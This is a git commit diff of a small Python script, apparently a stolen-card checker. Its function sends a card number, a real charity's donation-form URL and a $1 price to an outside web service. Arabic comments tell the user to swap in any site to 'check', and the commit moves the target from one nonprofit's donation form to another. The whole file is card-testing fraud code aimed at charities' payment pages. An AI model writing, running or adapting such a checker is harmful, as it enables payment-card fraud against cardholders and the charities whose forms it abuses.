3078996c139ec8841425a1045586d798567ceeac
fdg277744-alt <fdg277744@gmail.com>
2026-04-19 10:29:45 +0200

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -4,7 +4,7 @@ def chkk(ccx):
     cc = ccx.strip()
     # هنا يجب تعديل الرابط حسب الموقع الذي تريد فحصه
     # مثلاً: https://brightercommunities.org/donate-form/
-    urll = "https://brooklynanimalaction.org/donations/adoption-form-legacy/"  # ضع الرابط الكامل
+    urll = "https://heartsspeak.org/donate-form/"  # ضع الرابط الكامل
     price = "1"  # يمكن تغيير القيمة حسب المبلغ المطلوب
     res = requests.get(f'http://john-production.up.railway.app/pay?cc={cc}&url={urll}&price={price}').text
     return res
